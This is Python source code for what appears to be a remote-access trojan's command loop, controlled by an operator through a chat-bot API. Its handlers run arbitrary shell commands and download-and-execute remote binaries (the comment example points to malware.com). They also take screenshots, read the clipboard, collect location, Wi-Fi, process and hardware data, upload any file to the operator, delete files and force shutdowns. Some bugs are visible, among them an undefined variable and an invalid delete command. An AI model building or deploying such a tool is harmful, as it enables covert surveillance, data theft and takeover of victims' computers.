# grab recent command via API class, call necessary library
# import module in another folder: from <folder-name> import <module-name>
from libs import location
from libs import metadata
from libs import screenshot
from libs import shell
from libs import binaryexec
from libs import report
from libs import soundplay
from libs import clipboardgrab
from libs import winpop
from classes import message
from classes import API
import os

#insert API token here
apiCalls = API.API("Enter API token here")
commandObj = apiCalls.GetMessage()



fullCommand = commandObj.MessageText()
commandSplit = fullCommand.split(" ")
if commandSplit[0] == "/whoami":
    out = shell.executeSysCmd("cmd.exe /c whoami", "", True)
    apiCalls.SendResult(commandObj.ChatID(), commandObj.MessageID(), out)
elif commandSplit[0] == "/screenshot":
    print("[+] Checking length of /screenshot command...")
    if len(commandSplit) < 2:
        print("[!] Screenshot requires at least 2 arguments. Sending error back to operator...")
        apiCalls.ErrorLogger(commandObj.ChatID(), "/screenshot command requires at least 2 arguments. Example: /screenshot 2 <- to take 2 screenshots")
    else:
        print("[+] Sufficient length. Taking screenshots...")
        shotLocation = screenshot.takeScreenshot(commandSplit[1])
        for i in shotLocation:
            print("[+] Sending screenshot from {0} to operator...".format(i))
            apiCalls.UploadPhoto(commandObj.ChatID(), i)
            os.remove(i)
elif commandSplit[0] == "/location":
    locationData = location.locationSnab()
    print("[+] Sending approx. location data to operator...")
    apiCalls.SendResult(commandObj.ChatID(), commandObj.MessageID(), locationData)
elif commandSplit[0] == "/metadata":
    print("[+] Checking length of /metadata command...")
    if len(commandSplit) < 2:
        print("[!] /metadata command is of insufficient length!")
        apiCalls.ErrorLogger(commandObj.ChatID(), "/metadata command requires at least 2 arguments. Example: /metadata C:\\Users\\User17\\Files\\Important.docx")
    else:
        print("[+] Gathering metadata from {0}...".format(commandSplit[1]))
        fileData = metadata.retrieveMetadata(commandSplit[1])
        print("[+] Sending metadata back to operator...")
        apiCalls.SendResult(commandObj.ChatID(), commandObj.MessageID(), fileData)
elif commandSplit[0] == "/execute":
    print("[+] Checking length of /execute command...")
    if len(commandSplit) < 3:
        print("[!] /execute command is of insufficient length!")
        apiCalls.ErrorLogger(commandObj.ChatID(), "/execute command requires 3 arguments: /execute dir [/b,/c]")
    else:
        # check if there are any args to include w/command
        if commandSplit[2] == "noargs" or commandSplit[2] == "none":
            commandOutput = shell.executeSysCmd(commandSplit[1], "", True)
            # check if command result error'd out
            if str(commandOutput).startswith("Error"):
                print("[!] Error encountered in executeSysCmd function. Fwding to operator...")
                apiCalls.ErrorLogger(commandObj.ChatID(), commandOutput)
            else:
                print("[+] Sending output of {0} to operator...".format(commandSplit[1]))
                apiCalls.SendResult(commandObj.ChatID(), commandObj.MessageID(), commandOutput)
        else:
            # remove brackets & split on the comma to create a comma separated list
            commaSplitArgs = commandSplit[2][1:len(commandSplit[2])-1].split(",")
            commandOutput = shell.executeSysCmd(commandSplit[1], commaSplitArgs)
            if str(commandOutput).startswith("Error"):
                print("[!] Error encountered in executeSysCmd function. Fwding to operator...")
                apiCalls.ErrorLogger(commandObj.ChatID(), commandOutput)
            else:
                print("[+] Sending output of {0} to operator...".format(commandSplit[1]))
                apiCalls.SendResult(commandObj.ChatID(), commandObj.MessageID(), commandOutput)
elif commandSplit[0] == "/power":
    print("[+] Checking length of /power command...")
    if len(commandSplit) < 2:
        print("[+] Insufficient length of command! Power requires 1 argument which would be pd, hibernate, or restart")
        apiCalls.ErrorLogger(commandObj.ChatID(), "Insufficient length of arguments passed to /power command. Requires 1 argument which would be: shutdown, hibernate, or restart")
    else:
        if commandSplit[1] == "hibernate":
            shell.executeSysCmd("cmd.exe /c shutdown /f /h", "", True)
        elif commandSplit[1] == "pd":
            shell.executeSysCmd("cmd.exe /c shutdown /f /s", "", True)
        elif commandSplit[1] == "restart":
            shell.executeSysCmd("cmd.exe /c shutdown /f /r", "", True)
        else:
            apiCalls.ErrorLogger(commandObj.ChatID(), "Invalid argument passed to the /power command.")
elif commandSplit[0] == "/ls":
    print("[+] Directory listing command received")
    if len(commandSplit) < 2:
        print("[!] No arguments received, returning directory listing for current directory")
        dirListing = shell.executeSysCmd("cmd.exe /c dir /q", "", True)
        apiCalls.SendResult(commandObj.ChatID(), commandObj.MessageID(), dirListing)
    else:
        print("[+] Argument received. Returning directory listing for specified directory")
        dirListing = shell.executeSysCmd("cmd.exe /c dir /q", commandSplit[1], False)
        apiCalls.SendResult(commandObj.ChatID(), commandObj.MessageID(), dirListing)
elif commandSplit[0] == "/delete":
    print("[+] Delete command received")
    if len(commandSplit) < 2:
        apiCalls.ErrorLogger(commandObj.ChatID(), "Insufficient number of arguments for /delete command! /delete requires 1 argument which is the path to the file to delete")
    else:
        shell.executeSysCmd("cmd.exe /c delete", commandSplit[1], False)
elif commandSplit[0] == "/wreport":
    print("[+] Grabbing wireless info...")
    profileList = shell.executeSysCmd("cmd.exe /c Netsh WLAN show profiles", "", True)
    drivers = shell.executeSysCmd("cmd.exe /c Netsh WLAN show drivers", "", True)
    interfaceList = shell.executeSysCmd("cmd.exe /c Netsh WLAN show interfaces", "", True)
elif commandSplit[0] == "/remotebinary":
    # download remote binary & execute it on machine
    # /remotebinary https://malware.com/url [optional args]
    if len(commandSplit) < 3:
        apiCalls.ErrorLogger(commandObj.ChatID(), "Insufficient number of arguments for /remotebinary command! Requires 3 arguments: /remotebinary url-for-executable [optional,args]. If no args are needed, simply pass noargs as last argument")
    else:
        if commandSplit[2] == "noargs" or commandSplit[2] == "none":
            print("[+] No arguments...")
            output = binaryexec.DnE(commandSplit[1], "", True)
        else:
            output = binaryexec.DnE(commandSplit[1], commandSplit[2], False)
        
        if output.startswith("Error"):
            print("[!] Error encountered when executing binary!")
            apiCalls.ErrorLogger(commandObj.ChatID(), output)
        else:
            print("[+] Fwding result of binary execution to operator...")
            apiCalls.SendResult(messageID.ChatID(), messageID.MessageID(), output)
elif commandSplit[0] == "/processes":
    print("[+] Gathering list of active processes...")
    processList = shell.executeSysCmd("cmd.exe /c tasklist", "", True)
    serviceList = shell.executeSysCmd("cmd.exe /c tasklist /svc", "", True)
    apiCalls.SendResult(commandObj.ChatID(), commandObj.MessageID(), processList)
    apiCalls.SendResult(commandObj.ChatID(), commandObj.MessageID(), serviceList)
elif commandSplit[0] == "/gather":
    print("[+] Checking length of /gather command...")
    if len(commandSplit) < 2:
        apiCalls.ErrorLogger(commandObj.ChatID(), "Insufficient commands in /gather command! /gather requires 1 additional argument, the path to the file you want to retrieve")
    else:
        apiCalls.UploadLocalFile(commandObj.ChatID(), commandSplit[1])
elif commandSplit[0] == "/report":
    hardwareInfo = report.hardwareInfo()
    versionInfo = report.softwareInfo()
    report = str(hardwareInfo) + "*" * 100 + str(versionInfo)
    apiCalls.SendResult(commandObj.ChatID(), commandObj.MessageID(), report)
elif commandSplit[0] == "/playnoise":
    print("[+] Checking length of /playnoise cmd...")
    if len(commandSplit) < 2:
        apiCalls.ErrorLogger(commandObj.ChatID(), "Insufficient amount of arguments when calling /playnoise command! Requires 1 additional argument: the type of sound to play.")
    else:
        out = soundplay.playSound(commandSplit[1])
        if out.startswith("Error"):
            apiCalls.ErrorLogger(commandObj.ChatID(), "Unable to play sound")
        elif out.startswith("Sound type"):
            apiCalls.ErrorLogger(commandObj.ChatID(), "The sound type specified is nonexistent. Please look at the help menu for a list of available sounds")
        else:
            print("[+] Success playing sound!")
elif commandSplit[0] == "/gatherclip":
    # return data in clipboard
    data = clipboardgrab.returnData()
    apiCalls.SendResult(commandObj.ChatID(), commandObj.MessageID(), data)
elif commandSplit[0] == "/messagebox":
    # /messagebox text caption
    print("[+] Checking length of /messagebox cmd...")
    if len(commandSplit) < 3:
        apiCalls.ErrorLogger(commandObj.ChatID(), "Insufficient amount of arguments when calling /messagebox command! Requires 2 additional arguments: the text and title of the window")
    else:
        winpop.createMessage(commandSplit[1], commandSplit[2])
else:
    apiCalls.ErrorLogger(commandObj.ChatID(), "Command not available!")
